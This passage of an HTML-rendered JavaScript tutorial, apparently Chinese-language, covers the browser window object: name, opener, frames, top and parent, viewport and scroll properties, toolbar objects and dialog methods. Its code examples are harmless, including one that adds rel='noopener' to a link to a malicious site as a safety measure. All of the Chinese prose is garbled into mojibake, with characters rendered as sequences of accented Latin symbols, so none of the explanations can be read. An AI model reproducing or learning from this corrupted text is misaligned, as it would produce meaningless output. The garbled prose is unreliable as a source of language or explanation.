</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>a</code>æ˜¯ä¸€ä¸ªæ²¡æœ‰å£°æ˜å°±ç›´æ¥èµ‹å€¼çš„å˜é‡ï¼Œå®ƒè‡ªåŠ¨æˆä¸ºé¡¶å±‚å¯¹è±¡çš„å±æ€§ã€‚</p><p><code>window</code>æœ‰è‡ªå·±çš„å®ä½“å«ä¹‰ï¼Œå…¶å®ä¸é€‚åˆå½“ä½œæœ€é«˜ä¸€å±‚çš„é¡¶å±‚å¯¹è±¡ï¼Œè¿™æ˜¯ä¸€ä¸ªè¯­è¨€çš„è®¾è®¡å¤±è¯¯ã€‚æœ€æ—©ï¼Œè®¾è®¡è¿™é—¨è¯­è¨€çš„æ—¶å€™ï¼ŒåŸå§‹è®¾æƒ³æ˜¯è¯­è¨€å†…ç½®çš„å¯¹è±¡è¶Šå°‘è¶Šå¥½ï¼Œè¿™æ ·å¯ä»¥æé«˜æµè§ˆå™¨çš„æ€§èƒ½ã€‚å› æ­¤ï¼Œè¯­è¨€è®¾è®¡è€… Brendan Eich å°±æŠŠ<code>window</code>å¯¹è±¡å½“ä½œé¡¶å±‚å¯¹è±¡ï¼Œæ‰€æœ‰æœªå£°æ˜å°±èµ‹å€¼çš„å˜é‡éƒ½è‡ªåŠ¨å˜æˆ<code>window</code>å¯¹è±¡çš„å±æ€§ã€‚è¿™ç§è®¾è®¡ä½¿å¾—ç¼–è¯‘é˜¶æ®µæ— æ³•æ£€æµ‹å‡ºæœªå£°æ˜å˜é‡ï¼Œä½†åˆ°äº†ä»Šå¤©å·²ç»æ²¡æœ‰åŠæ³•çº æ­£äº†ã€‚</p><h3 id="window-å¯¹è±¡çš„å±æ€§" tabindex="-1"><a class="header-anchor" href="#window-å¯¹è±¡çš„å±æ€§" aria-hidden="true">#</a> window å¯¹è±¡çš„å±æ€§</h3><h4 id="window-name" tabindex="-1"><a class="header-anchor" href="#window-name" aria-hidden="true">#</a> window.name</h4><p><code>window.name</code>å±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå½“å‰æµè§ˆå™¨çª—å£çš„åå­—ã€‚çª—å£ä¸ä¸€å®šéœ€è¦åå­—ï¼Œè¿™ä¸ªå±æ€§ä¸»è¦é…åˆè¶…é“¾æ¥å’Œè¡¨å•çš„<code>target</code>å±æ€§ä½¿ç”¨ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&#39;Hello World!&#39;</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
<span class="token comment">// &quot;Hello World!&quot;</span>
</code></pre></div><p>è¯¥å±æ€§åªèƒ½ä¿å­˜å­—ç¬¦ä¸²ï¼Œå¦‚æœå†™å…¥çš„å€¼ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä¼šè‡ªåŠ¨è½¬æˆå­—ç¬¦ä¸²ã€‚å„ä¸ªæµè§ˆå™¨å¯¹è¿™ä¸ªå€¼çš„å‚¨å­˜å®¹é‡æœ‰æ‰€ä¸åŒï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´ï¼Œå¯ä»¥é«˜è¾¾å‡ MBã€‚</p><p>åªè¦æµè§ˆå™¨çª—å£ä¸å…³é—­ï¼Œè¿™ä¸ªå±æ€§æ˜¯ä¸ä¼šæ¶ˆå¤±çš„ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œè®¿é—®<code>a.com</code>æ—¶ï¼Œè¯¥é¡µé¢çš„è„šæœ¬è®¾ç½®äº†<code>window.name</code>ï¼Œæ¥ä¸‹æ¥åœ¨åŒä¸€ä¸ªçª—å£é‡Œé¢è½½å…¥äº†<code>b.com</code>ï¼Œæ–°é¡µé¢çš„è„šæœ¬å¯ä»¥è¯»åˆ°ä¸Šä¸€ä¸ªç½‘é¡µè®¾ç½®çš„<code>window.name</code>ã€‚é¡µé¢åˆ·æ–°ä¹Ÿæ˜¯è¿™ç§æƒ…å†µã€‚ä¸€æ—¦æµè§ˆå™¨çª—å£å…³é—­åï¼Œè¯¥å±æ€§ä¿å­˜çš„å€¼å°±ä¼šæ¶ˆå¤±ï¼Œå› ä¸ºè¿™æ—¶çª—å£å·²ç»ä¸å­˜åœ¨äº†ã€‚</p><h4 id="window-closed-window-opener" tabindex="-1"><a class="header-anchor" href="#window-closed-window-opener" aria-hidden="true">#</a> window.closedï¼Œwindow.opener</h4><p><code>window.closed</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºçª—å£æ˜¯å¦å…³é—­ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>closed <span class="token comment">// false</span>
</code></pre></div><p>ä¸Šé¢ä»£ç æ£€æŸ¥å½“å‰çª—å£æ˜¯å¦å…³é—­ã€‚è¿™ç§æ£€æŸ¥æ„ä¹‰ä¸å¤§ï¼Œå› ä¸ºåªè¦èƒ½è¿è¡Œä»£ç ï¼Œå½“å‰çª—å£è‚¯å®šæ²¡æœ‰å…³é—­ã€‚è¿™ä¸ªå±æ€§ä¸€èˆ¬ç”¨æ¥æ£€æŸ¥ï¼Œä½¿ç”¨è„šæœ¬æ‰“å¼€çš„æ–°çª—å£æ˜¯å¦å…³é—­ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> popup <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>popup <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>popup<span class="token punctuation">.</span>closed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// çª—å£ä»ç„¶æ‰“å¼€ç€</span>
<span class="token punctuation">}</span>
</code></pre></div><p><code>window.opener</code>å±æ€§è¡¨ç¤ºæ‰“å¼€å½“å‰çª—å£çš„çˆ¶çª—å£ã€‚å¦‚æœå½“å‰çª—å£æ²¡æœ‰çˆ¶çª—å£ï¼ˆå³ç›´æ¥åœ¨åœ°å€æ è¾“å…¥æ‰“å¼€ï¼‰ï¼Œåˆ™è¿”å›<code>null</code>ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>opener <span class="token operator">===</span> window <span class="token comment">// true</span>
</code></pre></div><p>ä¸Šé¢è¡¨è¾¾å¼ä¼šæ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œç„¶åè¿”å›<code>true</code>ã€‚</p><p>å¦‚æœä¸¤ä¸ªçª—å£ä¹‹é—´ä¸éœ€è¦é€šä¿¡ï¼Œå»ºè®®å°†å­çª—å£çš„<code>opener</code>å±æ€§æ˜¾å¼è®¾ä¸º<code>null</code>ï¼Œè¿™æ ·å¯ä»¥å‡å°‘ä¸€äº›å®‰å…¨éšæ‚£ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> newWin <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&#39;example.html&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;newWindow&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;height=400,width=400&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
newWin<span class="token punctuation">.</span>opener <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå­çª—å£çš„<code>opener</code>å±æ€§è®¾ä¸º<code>null</code>ï¼Œä¸¤ä¸ªçª—å£ä¹‹é—´å°±æ²¡åŠæ³•å†è”ç³»äº†ã€‚</p><p>é€šè¿‡<code>opener</code>å±æ€§ï¼Œå¯ä»¥è·å¾—çˆ¶çª—å£çš„å…¨å±€å±æ€§å’Œæ–¹æ³•ï¼Œä½†åªé™äºä¸¤ä¸ªçª—å£åŒæºçš„æƒ…å†µï¼ˆå‚è§ã€ŠåŒæºé™åˆ¶ã€‹ä¸€ç« ï¼‰ï¼Œä¸”å…¶ä¸­ä¸€ä¸ªçª—å£ç”±å¦ä¸€ä¸ªæ‰“å¼€ã€‚<code>&lt;a&gt;</code>å…ƒç´ æ·»åŠ <code>rel=&quot;noopener&quot;</code>å±æ€§ï¼Œå¯ä»¥é˜²æ­¢æ–°æ‰“å¼€çš„çª—å£è·å–çˆ¶çª—å£ï¼Œå‡è½»è¢«æ¶æ„ç½‘ç«™ä¿®æ”¹çˆ¶çª—å£ URL çš„é£é™©ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">&quot;https://an.evil.site&quot;</span> target<span class="token operator">=</span><span class="token string">&quot;_blank&quot;</span> rel<span class="token operator">=</span><span class="token string">&quot;noopener&quot;</span><span class="token operator">&gt;</span>
æ¶æ„ç½‘ç«™
<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
</code></pre></div><h4 id="window-self-window-window" tabindex="-1"><a class="header-anchor" href="#window-self-window-window" aria-hidden="true">#</a> window.selfï¼Œwindow.window</h4><p><code>window.self</code>å’Œ<code>window.window</code>å±æ€§éƒ½æŒ‡å‘çª—å£æœ¬èº«ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>self <span class="token operator">===</span> window <span class="token comment">// true</span>
window<span class="token punctuation">.</span>window <span class="token operator">===</span> window <span class="token comment">// true</span>
</code></pre></div><h4 id="window-frames-window-length" tabindex="-1"><a class="header-anchor" href="#window-frames-window-length" aria-hidden="true">#</a> window.framesï¼Œwindow.length</h4><p><code>window.frames</code>å±æ€§è¿”å›ä¸€ä¸ªç±»ä¼¼æ•°ç»„çš„å¯¹è±¡ï¼Œæˆå‘˜ä¸ºé¡µé¢å†…æ‰€æœ‰æ¡†æ¶çª—å£ï¼ŒåŒ…æ‹¬<code>frame</code>å…ƒç´ å’Œ<code>iframe</code>å…ƒç´ ã€‚<code>window.frames[0]</code>è¡¨ç¤ºé¡µé¢ä¸­ç¬¬ä¸€ä¸ªæ¡†æ¶çª—å£ã€‚</p><p>å¦‚æœ<code>iframe</code>å…ƒç´ è®¾ç½®äº†<code>id</code>æˆ–<code>name</code>å±æ€§ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨å±æ€§å€¼ï¼Œå¼•ç”¨è¿™ä¸ª<code>iframe</code>çª—å£ã€‚æ¯”å¦‚<code>&lt;iframe name=&quot;myIFrame&quot;&gt;</code>å¯ä»¥ç”¨<code>frames[&#39;myIFrame&#39;]</code>æˆ–è€…<code>frames.myIFrame</code>æ¥å¼•ç”¨ã€‚</p><p><code>frames</code>å±æ€§å®é™…ä¸Šæ˜¯<code>window</code>å¯¹è±¡çš„åˆ«åã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>frames <span class="token operator">===</span> window <span class="token comment">// true</span>
</code></pre></div><p>å› æ­¤ï¼Œ<code>frames[0]</code>ä¹Ÿå¯ä»¥ç”¨<code>window[0]</code>è¡¨ç¤ºã€‚ä½†æ˜¯ï¼Œä»è¯­ä¹‰ä¸Šçœ‹ï¼Œ<code>frames</code>æ›´æ¸…æ™°ï¼Œè€Œä¸”è€ƒè™‘åˆ°<code>window</code>è¿˜æ˜¯å…¨å±€å¯¹è±¡ï¼Œå› æ­¤æ¨èè¡¨ç¤ºå¤šçª—å£æ—¶ï¼Œæ€»æ˜¯ä½¿ç”¨<code>frames[0]</code>çš„å†™æ³•ã€‚æ›´å¤šä»‹ç»è¯·çœ‹ä¸‹æ–‡çš„ã€Šå¤šçª—å£æ“ä½œã€‹éƒ¨åˆ†ã€‚</p><p><code>window.length</code>å±æ€§è¿”å›å½“å‰ç½‘é¡µåŒ…å«çš„æ¡†æ¶æ€»æ•°ã€‚å¦‚æœå½“å‰ç½‘é¡µä¸åŒ…å«<code>frame</code>å’Œ<code>iframe</code>å…ƒç´ ï¼Œé‚£ä¹ˆ<code>window.length</code>å°±è¿”å›<code>0</code>ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>frames<span class="token punctuation">.</span>length <span class="token operator">===</span> window<span class="token punctuation">.</span>length <span class="token comment">// true</span>
</code></pre></div><p>ä¸Šé¢ä»£ç è¡¨ç¤ºï¼Œ<code>window.frames.length</code>ä¸<code>window.length</code>åº”è¯¥æ˜¯ç›¸ç­‰çš„ã€‚</p><h4 id="window-frameelement" tabindex="-1"><a class="header-anchor" href="#window-frameelement" aria-hidden="true">#</a> window.frameElement</h4><p><code>window.frameElement</code>å±æ€§ä¸»è¦ç”¨äºå½“å‰çª—å£åµŒåœ¨å¦ä¸€ä¸ªç½‘é¡µçš„æƒ…å†µï¼ˆåµŒå…¥<code>&lt;object&gt;</code>ã€<code>&lt;iframe&gt;</code>æˆ–<code>&lt;embed&gt;</code>å…ƒç´ ï¼‰ï¼Œè¿”å›å½“å‰çª—å£æ‰€åœ¨çš„é‚£ä¸ªå…ƒç´ èŠ‚ç‚¹ã€‚å¦‚æœå½“å‰çª—å£æ˜¯é¡¶å±‚çª—å£ï¼Œæˆ–è€…æ‰€åµŒå…¥çš„é‚£ä¸ªç½‘é¡µä¸æ˜¯åŒæºçš„ï¼Œè¯¥å±æ€§è¿”å›<code>null</code>ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;iframe src=&quot;about.html&quot;&gt;&lt;/iframe&gt;</span>

<span class="token comment">// ä¸‹é¢çš„è„šæœ¬åœ¨ about.html é‡Œé¢</span>
<span class="token keyword">var</span> frameEl <span class="token operator">=</span> window<span class="token punctuation">.</span>frameElement<span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>frameEl<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  frameEl<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&#39;other.html&#39;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>frameEl</code>å˜é‡å°±æ˜¯<code>&lt;iframe&gt;</code>å…ƒç´ ã€‚</p><h4 id="window-top-window-parent" tabindex="-1"><a class="header-anchor" href="#window-top-window-parent" aria-hidden="true">#</a> window.topï¼Œwindow.parent</h4><p><code>window.top</code>å±æ€§æŒ‡å‘æœ€é¡¶å±‚çª—å£ï¼Œä¸»è¦ç”¨äºåœ¨æ¡†æ¶çª—å£ï¼ˆframeï¼‰é‡Œé¢è·å–é¡¶å±‚çª—å£ã€‚</p><p><code>window.parent</code>å±æ€§æŒ‡å‘çˆ¶çª—å£ã€‚å¦‚æœå½“å‰çª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œ<code>window.parent</code>æŒ‡å‘è‡ªèº«ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>parent <span class="token operator">!==</span> window<span class="token punctuation">.</span>top<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// è¡¨æ˜å½“å‰çª—å£åµŒå…¥ä¸æ­¢ä¸€å±‚</span>
<span class="token punctuation">}</span>
</code></pre></div><p>å¯¹äºä¸åŒ…å«æ¡†æ¶çš„ç½‘é¡µï¼Œè¿™ä¸¤ä¸ªå±æ€§ç­‰åŒäº<code>window</code>å¯¹è±¡ã€‚</p><h4 id="window-status" tabindex="-1"><a class="header-anchor" href="#window-status" aria-hidden="true">#</a> window.status</h4><p><code>window.status</code>å±æ€§ç”¨äºè¯»å†™æµè§ˆå™¨çŠ¶æ€æ çš„æ–‡æœ¬ã€‚ä½†æ˜¯ï¼Œç°åœ¨å¾ˆå¤šæµè§ˆå™¨éƒ½ä¸å…è®¸æ”¹å†™çŠ¶æ€æ æ–‡æœ¬ï¼Œæ‰€ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ä¸ä¸€å®šæœ‰æ•ˆã€‚</p><h4 id="window-devicepixelratio" tabindex="-1"><a class="header-anchor" href="#window-devicepixelratio" aria-hidden="true">#</a> window.devicePixelRatio</h4><p><code>window.devicePixelRatio</code>å±æ€§è¿”å›ä¸€ä¸ªæ•°å€¼ï¼Œè¡¨ç¤ºä¸€ä¸ª CSS åƒç´ çš„å¤§å°ä¸ä¸€ä¸ªç‰©ç†åƒç´ çš„å¤§å°ä¹‹é—´çš„æ¯”ç‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ª CSS åƒç´ ç”±å¤šå°‘ä¸ªç‰©ç†åƒç´ ç»„æˆã€‚å®ƒå¯ä»¥ç”¨äºåˆ¤æ–­ç”¨æˆ·çš„æ˜¾ç¤ºç¯å¢ƒï¼Œå¦‚æœè¿™ä¸ªæ¯”ç‡è¾ƒå¤§ï¼Œå°±è¡¨ç¤ºç”¨æˆ·æ­£åœ¨ä½¿ç”¨é«˜æ¸…å±å¹•ï¼Œå› æ­¤å¯ä»¥æ˜¾ç¤ºè¾ƒå¤§åƒç´ çš„å›¾ç‰‡ã€‚</p><h4 id="ä½ç½®å¤§å°å±æ€§" tabindex="-1"><a class="header-anchor" href="#ä½ç½®å¤§å°å±æ€§" aria-hidden="true">#</a> ä½ç½®å¤§å°å±æ€§</h4><p>ä»¥ä¸‹å±æ€§è¿”å›<code>window</code>å¯¹è±¡çš„ä½ç½®ä¿¡æ¯å’Œå¤§å°ä¿¡æ¯ã€‚</p><p>**ï¼ˆ1ï¼‰window.screenXï¼Œwindow.screenY **</p><p><code>window.screenX</code>å’Œ<code>window.screenY</code>å±æ€§ï¼Œè¿”å›æµè§ˆå™¨çª—å£å·¦ä¸Šè§’ç›¸å¯¹äºå½“å‰å±å¹•å·¦ä¸Šè§’çš„æ°´å¹³è·ç¦»å’Œå‚ç›´è·ç¦»ï¼ˆå•ä½åƒç´ ï¼‰ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p><p><strong>ï¼ˆ2ï¼‰ window.innerHeightï¼Œwindow.innerWidth</strong></p><p><code>window.innerHeight</code>å’Œ<code>window.innerWidth</code>å±æ€§ï¼Œè¿”å›ç½‘é¡µåœ¨å½“å‰çª—å£ä¸­å¯è§éƒ¨åˆ†çš„é«˜åº¦å’Œå®½åº¦ï¼Œå³â€œè§†å£â€ï¼ˆviewportï¼‰çš„å¤§å°ï¼ˆå•ä½åƒç´ ï¼‰ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p><p>ç”¨æˆ·æ”¾å¤§ç½‘é¡µçš„æ—¶å€™ï¼ˆæ¯”å¦‚å°†ç½‘é¡µä»100%çš„å¤§å°æ”¾å¤§ä¸º200%ï¼‰ï¼Œè¿™ä¸¤ä¸ªå±æ€§ä¼šå˜å°ã€‚å› ä¸ºè¿™æ—¶ç½‘é¡µçš„åƒç´ å¤§å°ä¸å˜ï¼ˆæ¯”å¦‚å®½åº¦è¿˜æ˜¯960åƒç´ ï¼‰ï¼Œåªæ˜¯æ¯ä¸ªåƒç´ å æ®çš„å±å¹•ç©ºé—´å˜å¤§äº†ï¼Œå› æ­¤å¯è§éƒ¨åˆ†ï¼ˆè§†å£ï¼‰å°±å˜å°äº†ã€‚</p><p>æ³¨æ„ï¼Œè¿™ä¸¤ä¸ªå±æ€§å€¼åŒ…æ‹¬æ»šåŠ¨æ¡çš„é«˜åº¦å’Œå®½åº¦ã€‚</p><p><strong>ï¼ˆ3ï¼‰window.outerHeightï¼Œwindow.outerWidth</strong></p><p><code>window.outerHeight</code>å’Œ<code>window.outerWidth</code>å±æ€§è¿”å›æµè§ˆå™¨çª—å£çš„é«˜åº¦å’Œå®½åº¦ï¼ŒåŒ…æ‹¬æµè§ˆå™¨èœå•å’Œè¾¹æ¡†ï¼ˆå•ä½åƒç´ ï¼‰ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p><p><strong>ï¼ˆ4ï¼‰window.scrollXï¼Œwindow.scrollY</strong></p><p><code>window.scrollX</code>å±æ€§è¿”å›é¡µé¢çš„æ°´å¹³æ»šåŠ¨è·ç¦»ï¼Œ<code>window.scrollY</code>å±æ€§è¿”å›é¡µé¢çš„å‚ç›´æ»šåŠ¨è·ç¦»ï¼Œå•ä½éƒ½ä¸ºåƒç´ ã€‚è¿™ä¸¤ä¸ªå±æ€§åªè¯»ã€‚</p><p>æ³¨æ„ï¼Œè¿™ä¸¤ä¸ªå±æ€§çš„è¿”å›å€¼ä¸æ˜¯æ•´æ•°ï¼Œè€Œæ˜¯åŒç²¾åº¦æµ®ç‚¹æ•°ã€‚å¦‚æœé¡µé¢æ²¡æœ‰æ»šåŠ¨ï¼Œå®ƒä»¬çš„å€¼å°±æ˜¯<code>0</code>ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœç”¨æˆ·å‘ä¸‹æ‹‰åŠ¨äº†å‚ç›´æ»šåŠ¨æ¡75åƒç´ ï¼Œé‚£ä¹ˆ<code>window.scrollY</code>å°±æ˜¯75å·¦å³ã€‚ç”¨æˆ·æ°´å¹³å‘å³æ‹‰åŠ¨æ°´å¹³æ»šåŠ¨æ¡200åƒç´ ï¼Œ<code>window.scrollX</code>å°±æ˜¯200å·¦å³ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>scrollY <span class="token operator">&lt;</span> <span class="token number">75</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  window<span class="token punctuation">.</span><span class="token function">scroll</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æœé¡µé¢å‘ä¸‹æ»šåŠ¨çš„è·ç¦»å°äº75åƒç´ ï¼Œé‚£ä¹ˆé¡µé¢å‘ä¸‹æ»šåŠ¨75åƒç´ ã€‚</p><p><strong>ï¼ˆ5ï¼‰window.pageXOffsetï¼Œwindow.pageYOffset</strong></p><p><code>window.pageXOffset</code>å±æ€§å’Œ<code>window.pageYOffset</code>å±æ€§ï¼Œæ˜¯<code>window.scrollX</code>å’Œ<code>window.scrollY</code>åˆ«åã€‚</p><h4 id="ç»„ä»¶å±æ€§" tabindex="-1"><a class="header-anchor" href="#ç»„ä»¶å±æ€§" aria-hidden="true">#</a> ç»„ä»¶å±æ€§</h4><p>ç»„ä»¶å±æ€§è¿”å›æµè§ˆå™¨çš„ç»„ä»¶å¯¹è±¡ã€‚è¿™æ ·çš„å±æ€§æœ‰ä¸‹é¢å‡ ä¸ªã€‚</p><ul><li><code>window.locationbar</code>ï¼šåœ°å€æ å¯¹è±¡</li><li><code>window.menubar</code>ï¼šèœå•æ å¯¹è±¡</li><li><code>window.scrollbars</code>ï¼šçª—å£çš„æ»šåŠ¨æ¡å¯¹è±¡</li><li><code>window.toolbar</code>ï¼šå·¥å…·æ å¯¹è±¡</li><li><code>window.statusbar</code>ï¼šçŠ¶æ€æ å¯¹è±¡</li><li><code>window.personalbar</code>ï¼šç”¨æˆ·å®‰è£…çš„ä¸ªäººå·¥å…·æ å¯¹è±¡</li></ul><p>è¿™äº›å¯¹è±¡çš„<code>visible</code>å±æ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè¿™äº›ç»„ä»¶æ˜¯å¦å¯è§ã€‚è¿™äº›å±æ€§åªè¯»ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>locationbar<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>menubar<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>scrollbars<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>toolbar<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>statusbar<span class="token punctuation">.</span>visible
window<span class="token punctuation">.</span>personalbar<span class="token punctuation">.</span>visible
</code></pre></div><h4 id="å…¨å±€å¯¹è±¡å±æ€§" tabindex="-1"><a class="header-anchor" href="#å…¨å±€å¯¹è±¡å±æ€§" aria-hidden="true">#</a> å…¨å±€å¯¹è±¡å±æ€§</h4><p>å…¨å±€å¯¹è±¡å±æ€§æŒ‡å‘ä¸€äº›æµè§ˆå™¨åŸç”Ÿçš„å…¨å±€å¯¹è±¡ã€‚</p><ul><li><code>window.document</code>ï¼šæŒ‡å‘<code>document</code>å¯¹è±¡ï¼Œè¯¦è§ã€Šdocument å¯¹è±¡ã€‹ä¸€ç« ã€‚æ³¨æ„ï¼Œè¿™ä¸ªå±æ€§æœ‰åŒæºé™åˆ¶ã€‚åªæœ‰æ¥è‡ªåŒæºçš„è„šæœ¬æ‰èƒ½è¯»å–è¿™ä¸ªå±æ€§ã€‚</li><li><code>window.location</code>ï¼šæŒ‡å‘<code>Location</code>å¯¹è±¡ï¼Œç”¨äºè·å–å½“å‰çª—å£çš„ URL ä¿¡æ¯ã€‚å®ƒç­‰åŒäº<code>document.location</code>å±æ€§ï¼Œè¯¦è§ã€ŠLocation å¯¹è±¡ã€‹ä¸€ç« ã€‚</li><li><code>window.navigator</code>ï¼šæŒ‡å‘<code>Navigator</code>å¯¹è±¡ï¼Œç”¨äºè·å–ç¯å¢ƒä¿¡æ¯ï¼Œè¯¦è§ã€ŠNavigator å¯¹è±¡ã€‹ä¸€ç« ã€‚</li><li><code>window.history</code>ï¼šæŒ‡å‘<code>History</code>å¯¹è±¡ï¼Œè¡¨ç¤ºæµè§ˆå™¨çš„æµè§ˆå†å²ï¼Œè¯¦è§ã€ŠHistory å¯¹è±¡ã€‹ä¸€ç« ã€‚</li><li><code>window.localStorage</code>ï¼šæŒ‡å‘æœ¬åœ°å‚¨å­˜çš„ localStorage æ•°æ®ï¼Œè¯¦è§ã€ŠStorage æ¥å£ã€‹ä¸€ç« ã€‚</li><li><code>window.sessionStorage</code>ï¼šæŒ‡å‘æœ¬åœ°å‚¨å­˜çš„ sessionStorage æ•°æ®ï¼Œè¯¦è§ã€ŠStorage æ¥å£ã€‹ä¸€ç« ã€‚</li><li><code>window.console</code>ï¼šæŒ‡å‘<code>console</code>å¯¹è±¡ï¼Œç”¨äºæ“ä½œæ§åˆ¶å°ï¼Œè¯¦è§ã€Šconsole å¯¹è±¡ã€‹ä¸€ç« ã€‚</li><li><code>window.screen</code>ï¼šæŒ‡å‘<code>Screen</code>å¯¹è±¡ï¼Œè¡¨ç¤ºå±å¹•ä¿¡æ¯ï¼Œè¯¦è§ã€ŠScreen å¯¹è±¡ã€‹ä¸€ç« ã€‚</li></ul><h4 id="window-issecurecontext" tabindex="-1"><a class="header-anchor" href="#window-issecurecontext" aria-hidden="true">#</a> window.isSecureContext</h4><p><code>window.isSecureContext</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºå½“å‰çª—å£æ˜¯å¦å¤„åœ¨åŠ å¯†ç¯å¢ƒã€‚å¦‚æœæ˜¯ HTTPS åè®®ï¼Œå°±æ˜¯<code>true</code>ï¼Œå¦åˆ™å°±æ˜¯<code>false</code>ã€‚</p><h3 id="window-å¯¹è±¡çš„æ–¹æ³•" tabindex="-1"><a class="header-anchor" href="#window-å¯¹è±¡çš„æ–¹æ³•" aria-hidden="true">#</a> window å¯¹è±¡çš„æ–¹æ³•</h3><h4 id="window-alert-window-prompt-window-confirm" tabindex="-1"><a class="header-anchor" href="#window-alert-window-prompt-window-confirm" aria-hidden="true">#</a> window.alert()ï¼Œwindow.prompt()ï¼Œwindow.confirm()</h4><p><code>window.alert()</code>ã€<code>window.prompt()</code>ã€<code>window.confirm()</code>éƒ½æ˜¯æµè§ˆå™¨ä¸ç”¨æˆ·äº’åŠ¨çš„å…¨å±€æ–¹æ³•ã€‚å®ƒä»¬ä¼šå¼¹å‡ºä¸åŒçš„å¯¹è¯æ¡†ï¼Œè¦æ±‚ç”¨æˆ·åšå‡ºå›åº”ã€‚æ³¨æ„ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œéƒ½æ˜¯æµè§ˆå™¨ç»Ÿä¸€è§„å®šçš„å¼æ ·ï¼Œæ— æ³•å®šåˆ¶ã€‚</p><p><strong>ï¼ˆ1ï¼‰window.alert()</strong></p><p><code>window.alert()</code>æ–¹æ³•å¼¹å‡ºçš„å¯¹è¯æ¡†ï¼Œåªæœ‰ä¸€ä¸ªâ€œç¡®å®šâ€æŒ‰é’®ï¼Œå¾€å¾€ç”¨æ¥é€šçŸ¥ç”¨æˆ·æŸäº›ä¿¡æ¯ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>window<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;Hello World&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
